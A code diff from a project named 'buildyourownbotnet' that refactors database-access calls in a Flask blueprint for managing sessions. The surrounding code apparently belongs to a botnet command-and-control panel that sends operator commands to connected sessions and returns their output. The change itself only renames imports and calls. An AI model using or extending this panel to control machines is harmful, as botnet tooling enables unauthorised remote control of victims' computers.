@@ -2,7 +2,7 @@ import json
 from flask import Blueprint, request, redirect, url_for, flash
 from flask_login import login_user, logout_user, current_user, login_required
 from buildyourownbotnet import app, db, server
-from buildyourownbotnet.core import dao
+from buildyourownbotnet.core.dao import session_dao, task_dao
 from buildyourownbotnet.models import Session
 
 
@@ -31,7 +31,7 @@ def session_remove():
 			return "Error ending session - please try again."
 
 	# remove session from database
-	s = Session.query.filter_by(owner=current_user.username, uid=session_uid)
+	s = session_dao.get_session(session_uid)
 	if s:
 		s.delete()
 		db.session.commit()
@@ -58,14 +58,14 @@ def session_cmd():
 		session_thread = owner_sessions[session_uid]
 
 		# store issued task in database
-		task = dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
+		task = task_dao.handle_task({'task': command, 'session': session_thread.info.get('uid')})
 
 		# send task and get response
 		session_thread.send_task(task)
 		response = session_thread.recv_task()
 
 		# update task record with result in database
-		result = dao.handle_task(response)
+		result = task_dao.handle_task(response)
 		return str(result['result']).encode()
 
 	else:
@@ -77,7 +77,7 @@ def session_cmd():
 def session_poll():
 	"""Return list of sessions (JSON)."""
 	new_sessions = []
-	for s in dao.get_user_sessions_new(current_user.id):
+	for s in session_dao.get_user_sessions_new(current_user.id):
 		new_sessions.append(s.serialize())
 		s.new = False
 		db.session.commit()
